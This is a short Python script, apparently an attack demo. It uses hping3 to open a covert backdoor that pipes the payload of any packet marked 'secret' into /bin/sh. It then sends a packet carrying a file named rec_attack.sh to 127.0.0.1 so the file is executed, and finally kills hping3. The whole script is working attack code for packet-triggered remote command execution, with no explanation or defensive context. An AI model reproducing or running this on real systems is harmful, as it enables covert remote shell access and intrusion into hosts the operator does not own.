import os
import time

os.system("sudo hping3 -I lo -9 secret --rand-source | /bin/sh &")
time.sleep(1)
os.system("sudo hping3 -R 127.0.0.1 -e secret -E rec_attack.sh -d 100 -c 1 --rand-source")
time.sleep(1)
os.system("sudo killall hping3")
